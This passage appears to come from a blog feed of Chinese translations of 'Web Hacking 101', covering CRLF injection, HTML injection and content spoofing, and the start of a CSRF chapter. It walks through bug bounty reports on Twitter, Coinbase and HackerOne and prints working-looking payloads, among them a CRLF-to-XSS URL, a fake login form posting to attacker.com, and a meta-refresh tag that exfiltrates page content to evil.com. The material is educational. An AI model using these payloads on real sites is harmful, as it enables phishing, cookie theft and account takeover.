尽管使用XSS的详细信息对于本示例而言并不重要，但应注意，FileDescriptor借助这一概念证明走得更远。 他向Twitter演示了如何利用以下URL利用此CRLF漏洞执行恶意JavaScript：</p><pre class="line-numbers language-none"><code class="language-none">https://twitter.com/login?redirect_after_login=https://twitter.com:21/%E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5 %98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28innerHTML%29%E5%98%BE<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>重要的细节是贯穿整个3个字节的值：<code>％E5％98％8A，％E5％98％8D，％E5％98％BC和％E5％98％BE</code>。 删除无效字符后，这些值分别被解码为<code>％0A，％0D，％3C和％3E</code>，它们都是HTML特殊字符。 字节<code>％3C</code>是左尖括号（&lt;），而<code>％3E</code>是右尖括号（&gt;）。</p><p>URL中的其他字符按原样包含在HTTP响应中。 因此，当用换行符解码编码的字节字符时，标头看起来像这样：</p><pre class="line-numbers language-none"><code class="language-none">https://twitter.com/login?redirect_after_login=https://twitter.com:21/ content-type:text/html location: &lt;svg/onload=alert(innerHTML)&gt; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>对payload进行解码以注入标头<code>content-type text / html</code>，这告诉浏览器响应将包含HTML。 Location标头使用<code>&lt;svg&gt;</code>标记执行JavaScript代码<code>alert（innerHTML）</code>。alert使用DOM<code> innerHTML</code>属性创建一个包含网页内容的警报框（<code>innerHTML</code>属性返回给定元素的HTML）。alert弹出内容包括已登录用户的会话和身份验证Cookie，表明攻击者可以窃取这些值。窃取身份验证Cookie可能会使攻击者登录目标的帐户，这解释了为什么FileDescriptor因发现此漏洞而获得3500美元的赏金。</p><p><strong>重点</strong></p><p>如果服务器以某种方式对字符％0D％0A进行了清理，请考虑一下网站可能如何执行此操作以及是否可以避开其工作，例如通过双重编码。您可以通过传递多字节字符并确定是否将其解码为其他字符来测试站点是否对附加值进行了错误处理。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>CRLF漏洞使攻击者可以通过更改标头来操纵HTTP响应。利用CRLF漏洞可能导致缓存中毒，防火墙规避，请求劫持或HTTP响应拆分。由于CRLF漏洞是由某个网站在其标头中反映未经过滤的用户输入<code>％0D％0A</code>引起的，因此在黑客入侵时监视和查看所有HTTP响应非常重要。此外，如果确实找到输入，则可以控制在HTTP标头中返回输入，但是字符<code>％0D％0A</code>被清除，请尝试像FileDescriptor一样包含多字节编码的输入，以确定站点如何处理对其进行解码。</p>]]></content>
      
      
      <categories>
          
          <category> WebHacking101 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞挖掘 </tag>
            
            <tag> web安全 </tag>
            
            <tag> CRLF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Part5 HTML注入和内容欺骗</title>
      <link href="part5-html-zhu-ru-he-nei-rong-tian-chong/"/>
      <url>part5-html-zhu-ru-he-nei-rong-tian-chong/</url>
      
        <content type="html"><![CDATA[<h1 id="Part5-HTML注入和内容欺骗"><a href="#Part5-HTML注入和内容欺骗" class="headerlink" title="Part5 HTML注入和内容欺骗"></a><center>Part5 HTML注入和内容欺骗</center></h1><p> <font color="#A52A2A" size="4"><em>本文部分翻译自《Web Hacking 101》，仅供参考学习，切勿二传。</em></font></p><p>超文本标记语言（HTML）注入和内容欺骗是允许恶意用户将内容注入网站网页的攻击。攻击者可以注入自己设计的HTML元素，通常将其作为模仿合法登录屏幕的<code>&lt;form&gt;</code>标记，以诱使目标向敏感站点提交敏感信息。由于这些类型的攻击依赖于欺骗目标（这种做法有时称为社会工程学），因此漏洞赏金计划将内容欺骗和HTML注入视为没有本书中涵盖的其他漏洞那么严重。</p><p>当网站允许攻击者通常通过某些表单输入或URL参数提交HTML标签，然后直接将其显示在Web页上时，就会发生HTML注入漏洞。这类似于跨站点脚本攻击，不同之处在于这些注入允许执行恶意JavaScript。</p><p>HTML注入有时称为虚拟污损（virtual defacement）。这是因为开发人员使用HTML语言来定义网页的结构。因此，如果攻击者可以注入HTML并由网站渲染它，则攻击者可以更改页面的外观。这种诱使用户通过伪造形式提交敏感信息的技术称为网络钓鱼。</p><p>例如，如果页面呈现了您可以控制的内容，则可以向页面添加<code>&lt;form&gt;</code>标记，要求用户重新输入其用户名和密码，如下所示：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html">➊ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>POST<span class="token punctuation">'</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>http://attacker.com/capture.php<span class="token punctuation">'</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>login-form<span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>text<span class="token punctuation">'</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>username<span class="token punctuation">'</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span><span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>password<span class="token punctuation">'</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>password<span class="token punctuation">'</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span><span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>submit<span class="token punctuation">'</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>submit<span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>当用户提交此表单时，信息将通过<code>action</code>属性发送到攻击者的网站<code>http：// &lt;attacker&gt; .com / capture.php</code>。</p><p>内容欺骗与HTML注入非常相似，只是攻击者只能注入纯文本，而不能注入HTML标签。 此限制通常是由服务器在发送HTTP响应时转义HTML标记引起的。 尽管攻击者无法使用内容欺骗来格式化网页，但他们可能能够插入看起来像合法网站内容的文本，例如消息。 这样的消息可以使目标愚弄目标去执行某项操作，但严重依赖于社会工程。 以下示例演示了如何探索这些漏洞。</p><h2 id="漏洞示例"><a href="#漏洞示例" class="headerlink" title="漏洞示例"></a>漏洞示例</h2><h3 id="通过字符编码的Coinbase评论注入"><a href="#通过字符编码的Coinbase评论注入" class="headerlink" title="通过字符编码的Coinbase评论注入"></a>通过字符编码的Coinbase评论注入</h3><p>难度：低</p><p>网址：<code>https://coinbase.com/apps/</code></p><p>资料来源：<a href="https://hackerone.com/reports/104543/">https://hackerone.com/reports/104543/</a></p><p>报告日期：2015年12月10日</p><p>赏金支付：200美元</p><p>有些网站会过滤掉HTML标记以抵御HTML注入；但是，有时可以通过了解字符HTML实体是如何工作的来绕过这个问题。对于此漏洞，报告者发现Coinbase在其用户评论中显示文本时解码HTML实体。在HTML中，有些字符是保留的，因为它们有特殊的用途（例如尖括号，&lt;&gt;，它是HTML的开始和结束标记），而没有保留的字符是没有特殊意义的普通字符（例如字母表中的字母）。保留字符应使用其HTML实体名称；例如，“&gt;”字符应由网站显示为“&gt;”；以避免注入漏洞。但即使是未保留的字符也可以用其HTML编码的数字显示；例如，字母“a”可以显示为“a”；。        </p><p>对于这个漏洞，漏洞报告者首先将纯HTML输入到一个文本输入字段中，该字段用于用户评论：        </p><p><code>&lt;h1&gt;This is a test&lt;/h1&gt;</code></p><p>Coinbase将过滤HTML并将其显示为纯文本，因此提交的文本将作为普通评论发布。它看起来和输入的完全一样，HTML标记被删除了。但是，如果用户以HTML编码的值提交文本，则如下所示：</p><pre class="line-numbers language-none"><code class="language-none">&amp;#60;&amp;#104;&amp;#49;&amp;#62;&amp;#84;&amp;#104;&amp;#105;&amp;#115;&amp;#32;&amp;#105;&amp;#115;&amp;#32;&amp;#97;&amp;#32;&amp;#116;&amp;#101;&amp;#115;&amp;#116;&amp;#60;&amp;#47;&amp;#104;&amp;#49;&amp;#62;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>Coinbase不会过滤掉标签，并将此字符串解码为HTML，这将导致网站在提交的评论中显示<code>&lt;h1&gt;</code>标签： </p><p>​       This is a test      </p><p>报告黑客使用HTML编码的值演示了如何使Coinbase显示用户名和密码字段：</p><pre class="line-numbers language-none"><code class="language-none">&amp;#85;&amp;#115;&amp;#101;&amp;#114;&amp;#110;&amp;#97;&amp;#109;&amp;#101;&amp;#58;&amp;#60;&amp;#98;&amp;#114;&amp;#62;&amp;#10;&amp;#60;&amp;#105;&amp;#110;&amp;#112;&amp;#117;&amp;#116;&amp;#32;&amp;#116;&amp;#121;&amp;#112;&amp;#101;&amp;#61;&amp;#34;&amp;#116;&amp;#101;&amp;#120;&amp;#116;&amp;#34;&amp;#32;&amp;#110;&amp;#97;&amp;#109;&amp;#101;&amp;#61;&amp;#34;&amp;#102;&amp;#105;&amp;#114;&amp;#115;&amp;#116;&amp;#110;&amp;#97;&amp;#109;&amp;#101;&amp;#34;&amp;#62;&amp;#10;&amp;#60;&amp;#98;&amp;#114;&amp;#62;&amp;#10;&amp;#80;&amp;#97;&amp;#115;&amp;#115;&amp;#119;&amp;#111;&amp;#114;&amp;#100;&amp;#58;&amp;#60;&amp;#98;&amp;#114;&amp;#62;&amp;#10;&amp;#60;&amp;#105;&amp;#110;&amp;#112;&amp;#117;&amp;#116;&amp;#32;&amp;#116;&amp;#121;&amp;#112;&amp;#101;&amp;#61;&amp;#34;&amp;#112;&amp;#97;&amp;#115;&amp;#115;&amp;#119;&amp;#111;&amp;#114;&amp;#100;&amp;#34;&amp;#32;&amp;#110;&amp;#97;&amp;#109;&amp;#101;&amp;#61;&amp;#34;&amp;#108;&amp;#97;&amp;#115;&amp;#116;&amp;#110;&amp;#97;&amp;#109;&amp;#101;&amp;#34;&amp;#62;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样生成的html如下</p><pre class="line-numbers language-html" data-language="html"><code class="language-html">Username:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>firstname<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>Password:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>lastname<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这显示为文本输入形式，看起来像是输入用户名和密码登录名的地方。恶意黑客可能利用此漏洞诱使用户向可以捕获凭据的恶意网站提交实际表单。但是，此漏洞取决于用户是否被骗而认为登录是真实的并提交其信息，但这不能保证。因此，与不需要用户交互的漏洞相比，Coinbase的收益较低。</p><p><strong>重点</strong></p><p>在测试网站时，请检查其如何处理不同类型的输入，包括纯文本和编码文本。请注意那些接受URI编码值（如％2F）并呈现其解码值（在这种情况下为/）的网站。</p><p>您可以在<code>https://gchq.github.io/CyberChef/</code>上找到一把很棒的瑞士军刀，其中包括编码工具。</p><p>检查一下，然后尝试支持的不同类型的编码。</p><h3 id="HackerOne-html包含"><a href="#HackerOne-html包含" class="headerlink" title="HackerOne html包含"></a>HackerOne html包含</h3><p>难度：中等</p><p>网址：<code>https://hackerone.com/reports/&lt;report_id&gt;/</code></p><p>资料来源：<a href="https://hackerone.com/reports/110578/">https://hackerone.com/reports/110578/</a></p><p>报告日期：2016年1月13日</p><p>赏金支付：$ 500</p><p>我将在这里讨论的错误使用Markdown语法生成具有title属性的<code>&lt;a&gt;</code>。通常，此语法为：</p><p><code>[test](https://torontowebsitedeveloper.com "Your title tag here")</code></p><p>方括号之间的文本成为显示的文本，链接到的URL包含在括号中，同时包含title属性，title属性包含在一组双引号中。此语法创建以下HTML：</p><p><code>&lt;a href="https://torontowebsitedeveloper.com" title="Your title tag here"&gt;test&lt;/a&gt;</code></p><p> 2016年1月，Inti De Ceukelaire注意到HackerOne的Markdown编辑器配置错误，攻击者可以在Markdown语法中插入一个单引号，在HackerOne中所有使用Markdown编辑器的生成的HTML中都会被插入一个单引号。漏洞赏金计划管理页面以及报告都很容易受到攻击。如果攻击者能够在管理页面中找到第二个漏洞，并在页面开头的<code>&lt;meta&gt;</code>标记中插入第二个单引号，他们可以利用浏览器HTML解析来提取页面内容。原因是<code>&lt;meta&gt;</code>标签告诉浏览器通过标签的<code>content</code>属性中定义的URL刷新页面。显示页面时，浏览器将对<code>content</code>的URL执行GET请求。该页面中的内容可以作为GET请求的参数发送，攻击者可以使用该参数来提取目标的数据。这是带有注入的单引号的恶意<code>&lt;meta&gt;</code>标记：</p><p><code>&lt;meta http-equiv =“refresh” content ='0; url = https://evil.com/log.php?text =</code></p><p>0表示浏览器在对URL发出HTTP请求之前等待多长时间。在这种情况下，浏览器将立即向<code>https://evil.com/log.php?text=</code>发出HTTP请求。 HTTP请求将包括从content属性开始的单引号和攻击者使用网页上的Markdown解析器注入的单引号之间的所有内容。这是一个例子：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>   &lt;meta http-equiv="refresh" content=➊'0; url=https://evil.com/log.php?text=  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">&gt;</span></span>Some content<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span>   **--snip--**   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>csrf-token<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>ab34513cdfe123ad1f<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  **--snip--**   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>attacker input with '➋ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>  **--snip--**  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>页面内容从content属性之后的第一个单引号➊到➋的攻击者输入的单引号将作为URL文本参数的一部分发送给攻击者。还包括来自隐藏的跨站点请求伪造（CSRF）令牌。</p><p>通常，对于HackerOne来说，HTML注入的风险不会成为问题，因为它使用React JavaScript框架来显示其HTML。 React是一个Facebook库，旨在动态更新网页内容而无需重新加载整个页面。使用React的另一个好处是，除非JavaScript功能危险地使用<code>SetInnerHTML</code>来直接更新DOM并显示HTML（DOM是HTML和XML文档的API，允许开发人员修改结构，样式，和网页内容（通过JavaScript））。事实证明，HackerOne危险地使用了<code>SetInnerHTML</code>，因为它信任从服务器接收的HTML。因此，它是将HTML直接注入DOM而不进行转义。</p><p>尽管De Ceukelaire无法利用此漏洞，但他确实确定了可以在HackerOne显示CSRF令牌后插入单引号的页面。因此，从理论上讲，如果HackerOne进行了代码更改，使攻击者可以在同一页面的<code>&lt;meta&gt;</code>标记中插入另一个单引号，则攻击者可以窃取目标的CSRF令牌并进行CSRF攻击。 HackerOne同意了潜在的风险，解决了该报告，并授予De Ceukelaire 500美元。</p><p><strong>重点</strong></p><p>了解浏览器如何显示HTML和对某些HTML标签进行响应的细微差别将为您提供广泛的攻击面。 尽管并非所有程序都接受有关潜在理论攻击的报告，但是此知识将帮助您找到其他漏洞。 FileDescriptor在<code>https://blog.innerht.ml/csp-2015/#contentex</code>渗透中对<code>&lt;meta&gt;</code>刷新漏洞有很好的解释。</p><h3 id="HackerOne意外的HTML包含修复绕过"><a href="#HackerOne意外的HTML包含修复绕过" class="headerlink" title="HackerOne意外的HTML包含修复绕过"></a>HackerOne意外的HTML包含修复绕过</h3><p>难度：中等</p><p>网址：<code>https://hackerone.com/reports/&lt;report_id&gt;/</code></p><p>资料来源：<a href="https://hackerone.com/reports/112935/">https://hackerone.com/reports/112935/</a></p><p>报告日期：2016年1月26日</p><p>赏金支付：$ 500</p><p>当网站创建修复程序并解决报告时，修复所作的修改是不是就没有任何错误和漏洞呢。 阅读De Ceukelaire的报告后，决定测试HackerOne的修复程序，以查看其Markdown编辑器如何显示意外的输入。 为此，提交了以下内容：</p><pre class="line-numbers language-none"><code class="language-none">[test](http://www.torontowebsitedeveloper.com "test ismap="alert xss"  yyy="test"")<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>回想一下，为了使用Markdown的<code>&lt;a&gt;</code>标记，通常需要提供一个URL和一个title属性，并在括号中用双引号将其引起来。为了解析title属性，Markdown需要跟踪开头的双引号，其后的内容以及结尾的双引号。</p><p>是否可以将Markdown与其他随机双引号和属性混淆。于是，添加了有效的HTML属性<code>ismap =</code>，无效的HTML属性<code>yyy =</code>和多余的双引号的原因。提交此输入后，Markdown编辑器将代码解析为以下HTML：</p><pre class="line-numbers language-none"><code class="language-none">&lt;a title =“ test” ismap =“ alert xss” yyy =“ test” ref =“http://www.toronotwebsitedeveloper.com“&gt;test&lt;/a&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>请注意，De Ceukelaire的报告中的修复导致意外的漏洞，该漏洞导致Markdown解析器生成任意HTML。尽管无法立即利用此漏洞，但包含未经转义的HTML足以为HackerOne恢复其先前的修复并使用其他解决方案解决问题提供了ROC。。</p><p><strong>重点</strong></p><p>仅更新代码并不意味着所有漏洞都已修复。部署修复程序后，这意味着存在新代码，其中可能存在漏洞。</p><h3 id="withinsecurity网站的错误页面"><a href="#withinsecurity网站的错误页面" class="headerlink" title="withinsecurity网站的错误页面"></a>withinsecurity网站的错误页面</h3><p>难度：低</p><p>网址：<code>https://withinsecurity.com/wp-login.php</code></p><p>资料来源：<a href="https://hackerone.com/reports/111094/">https://hackerone.com/reports/111094/</a></p><p>报告日期：2016年1月16日</p><p>赏金支付：$ 250</p><p>withinsecurity建立在WordPress上的一个旨在共享安全新闻的网站，在<code>security.com/wp-login.php</code>页面上包含了标准的WordPress登录路径。黑客注意到，在登录过程中，如果发生错误，则会显示一个“access_denied”错误消息，该消息对应于URL中的error参数：</p><p><code>https://withinsecurity.com/wp-login.php?error=access_denied</code></p><p>注意到此行为，黑客尝试修改error参数。结果，站点显示了传递给参数的值，作为向用户显示的错误消息的一部分，甚至对URI编码的字符进行了解码。这是黑客使用的修改后的URL：</p><pre class="line-numbers language-none"><code class="language-none">https://withinsecurity.com/wp-login.php?error=Your%20account%20has%20been%20 hacked%2C%20Please%20call%20us%20this%20number%20919876543210%20OR%20Drop%20mail%20at%20attacker%40mail.com&amp;state=cb04a91ac5%257Chttps%253A%252F%252Fwithi nsecurity.com%252Fwp-admin%252F#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/part5-html-zhu-ru-he-nei-rong-tian-chong/Part5-HTML%E6%B3%A8%E5%85%A5%E5%92%8C%E5%86%85%E5%AE%B9%E5%A1%AB%E5%85%85%5Cinjection.png"></p><p><em>图5-1：攻击者能够将此“警告”注入WordPress管理页面</em></p><p>在WordPress登录字段上显示的实际上是错误信息（error）的参数。该信息指示用户联系攻击者的电话号码和电子邮件。这里的关键是注意到URL中的参数在页面上显示。只需测试是否可以更改access_denied参数，就可以发现此漏洞。</p><p><strong>重点</strong></p><p>注意那些可以在网站上显示的URL参数。它们可能会给攻击者提供文本注入漏洞的机会，攻击者可以利用这些漏洞对钓鱼目标进行攻击。网站上显示的可控URL参数有时会导致跨站点脚本攻击。有时这种行为只允许影响较小的内容欺骗和HTML注入攻击。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>HTML注入和内容欺骗允许黑客输入信息，并让HTML页面将该信息返回给目标受害者。攻击者可以将这些攻击用于网络钓鱼用户，并诱使他们访问或向恶意网站提交敏感信息。</p><p>发现这些类型的漏洞不仅是关于提交纯HTML，而且还涉及到探索一个站点如何显示您输入的文本。黑客应该留心操纵直接显示在网站上的URL参数。</p>]]></content>
      
      
      <categories>
          
          <category> WebHacking101 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞挖掘 </tag>
            
            <tag> web安全 </tag>
            
            <tag> HTML注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Part4 跨站请求伪造</title>
      <link href="part4-kua-zhan-qing-qiu-wei-zao/"/>
      <url>part4-kua-zhan-qing-qiu-wei-zao/</url>
      
        <content type="html"><![CDATA[<h1 id="Part4-跨站请求伪造"><a href="#Part4-跨站请求伪造" class="headerlink" title="Part4 跨站请求伪造"></a><center>Part4 跨站请求伪造</center></h1><p> <font color="#A52A2A" size="4"><em>本文部分翻译自《Web Hacking 101》，仅供参考学习，切勿二传。</em></font></p><p>当攻击者可以使目标的浏览器将HTTP请求发送到另一个网站时，就会发生跨站点请求伪造（CSRF）攻击。该网站执行操作，就好像请求是由目标发送的。这种攻击通常依赖于目标，该目标先前已在易受攻击的网站上进行了身份验证，在该网站上提交了该操作，并且在目标不知情的情况下发生了该攻击。 CSRF攻击成功后，攻击者便能够修改服务器端信息，甚至可能接管用户的帐户。以下是其一个例子：</p><pre class="line-numbers language-none"><code class="language-none">Bob登录他的银行网站以检查他的余额。然后，Bob在另一个网站上查看他的电子邮件。这时，Bob收到一封电子邮件，其中包含指向陌生的网站的链接，他单击该链接以查看其链接。加载后，陌生的网站会指示Bob的浏览器向Bob的银行网站发出HTTP请求，以请求从他的帐户向攻击者的帐户转移资金。Bob的银行网站接收到来自陌生（恶意）网站的HTTP请求。但是，由于银行网站没有任何CSRF保护，因此可以处理转帐。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="认证（Authorization）"><a href="#认证（Authorization）" class="headerlink" title="认证（Authorization）"></a>认证（Authorization）</h2><p>就像我刚才描述的那样，CRSF攻击利用了网站用于验证请求的过程中的弱点。当您访问要求您登录的网站时，通常使用用户名和密码登录，该网站通常会对您进行身份验证。然后，该网站会将身份验证存储在您的浏览器中，因此您不必每次访问该网站上的新页面时都登录。</p><p>它可以通过两种方式存储身份验证：使用基本身份验证协议或cookie。</p><p>当HTTP请求包括如下标头时，您可以标识使用基本授权的站点：Authorization  ：Basic QWxhZGRpbjpPcGVuU2VzYW1l。看起来像随机的字符串实际上是用base64编码的用户名和密码，中间用冒号分隔。QWxhZGRpbjpPcGVuU2VzYW11l解码为Aladdin：OpenSesame。</p><p>Cookies是网站创建并存储在用户浏览器中的小文件。网站使用Cookie的目的多种多样，例如用于存储诸如用户偏好设置或用户访问网站的历史记录之类的信息。 Cookies具有某些属性，它们是标准化的信息。这些详细信息向浏览器介绍了cookie以及如何处理它们。一些Cookie属性可以包括domain，expires，max-age，secure onlyHTTP。除了属性外，Cookie还可以包含一个名称/值（name/value）对，它由一个标识符和一个相关值组成。</p><p>浏览器定义站点可以设置的cookie数量。但通常，单个站点在普通浏览器中可以设置50至150个cookie，据报道某些站点最多支持600个cookie。浏览器通常允许站点为每个cookie最多使用4KB。 Cookie名称或值没有标准：网站可以自由选择自己的名称/值对和用途。例如，网站可以使用名为sessionId的cookie来记住用户是谁，这样就无需让用户为他们访问的每个页面或执行的操作输入用户名和密码。 （回想一下，HTTP请求是无状态的，如第1章所述。无状态是指对于每个HTTP请求，网站都不知道用户是谁，因此它必须为每个请求重新验证该用户的身份。）</p><p>例如，cookie中的名称/值对可以是<code>sessionId = 9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08</code>，并且cookie可以具有<code>.site.com</code>域。因此，sessionId cookie将被发送到用户访问的每个<code>.&lt;site&gt; .com</code>网站，例如<code>foo.&lt;site&gt; .com</code>，<code>bar.&lt;site&gt; .com</code>，<code>www.&lt;site&gt; .com</code>等。 。</p><p>secure和httponly属性告诉浏览器何时以及如何发送和读取cookie。这些属性不包含值。当cookie包含secure属性时，浏览器将仅在访问HTTPS站点时发送该cookie。例如，如果您使用secure的cookie访问<code>http：// www.&lt;site&gt; .com /</code>（HTTP站点），您的浏览器不会将cookie发送到该站点。原因是为了保护您的隐私，因为HTTPS连接是加密的，而HTTP连接不是加密的。httponly属性很重要，它告诉浏览器仅通过HTTP和HTTPS请求读取cookie。因此，浏览器将不允许任何脚本语言（例如JavaScript）读取该cookie的值。如果未在cookie中设置secure和httponly属性，则可以合法发送这些cookie，但会恶意读取。这将导致没有secure属性的cookie发送到非HTTPS站点，JavaScript可以读取未设置httponly的cookie。</p><p>expires和max-age属性指示cookie何时到期，何时浏览器应销毁它。 expires属性只是告诉浏览器在特定日期销毁cookie。例如，Cookie可以将属性设置为<code>expires = Wed，18 Dec 2019 12:00:00 UTC</code>。而max-age是指cookie过期之前的秒数，其格式为整数（<code>max-age= 300</code>）。</p><p>总而言之，如果Bob访问的银行网站使用Cookie，则该网站将通过以下过程存储其身份验证。Bob访问该网站并登录后，银行将使用HTTP响应来响应其HTTP请求，该HTTP响应包括一个标识Bob的cookie。鲍勃的浏览器将自动将该Cookie和所有其他HTTP请求一起发送到银行网站。</p><p>完成银行业务后，Bob离开银行网站时没有注销。请注意这个重要的细节，因为当您注销站点时，该站点通常会以HTTP响应来响应，该响应会使cookie过期。因此，当您重新访问该网站时，您将不得不再次登录。</p><p>当Bob查看电子邮件并单击链接访问未知网站时，表示他无意中访问了恶意网站。该网站旨在通过指示Bob的浏览器向其银行网站发出请求来进行CSRF攻击。该请求还会从他的浏览器发送cookie。</p><h2 id="CSRF与GET请求"><a href="#CSRF与GET请求" class="headerlink" title="CSRF与GET请求"></a>CSRF与GET请求</h2><p>恶意网站利用Bob的银行网站的方式取决于银行是否通过GET或POST请求接受转账。如果Bob的银行网站接受通过GET请求进行的转帐，则恶意网站将使用隐藏表格（hidden form）或<code>&lt;img&gt;</code>标签发送HTTP请求。 GET和POST方法都依靠HTML来使浏览器发送所需的HTTP请求，并且这两种方法都可以使用hidden form，但是只有GET方法可以使用<code>&lt;img&gt;</code>标记技术。在本节中，我们将研究使用GET请求方法时如何利用HTML<code> &lt;img&gt;</code>标记，并在下一节“CSRF与POST请求”中研究利用hidden form。</p><p>攻击者需要在向Bob的银行网站进行的任何传输HTTP请求中包括Bob的cookie。但是，由于攻击者无法读取Bob的cookie，因此攻击者不能仅创建HTTP请求并将其发送到银行网站。攻击者需要使用HTML <code>&lt;img&gt;</code>标记创建一个GET请求，其中包含Bob的cookie。 <code>&lt;img&gt;</code>标记在网页上呈现图像，它包含<code>src</code>属性，该属性指示浏览器在何处获取图像文件。当浏览器渲染<code>&lt;img&gt;</code>标记时，它将向标记中的<code>src</code>属性发出HTTP GET请求，并在该请求中包含所有现有的cookie。因此，假设恶意网站使用如下网址将$ 500从Bob转移到Joe：</p><p><code>https://www.bank.com/transfer?from=bob&amp;to=joe&amp;amount=500</code></p><p>那么，恶意的<code>&lt;img&gt;</code>标签将使用此URL作为其<code>src</code>值：</p><p><code>&lt;img src =“ 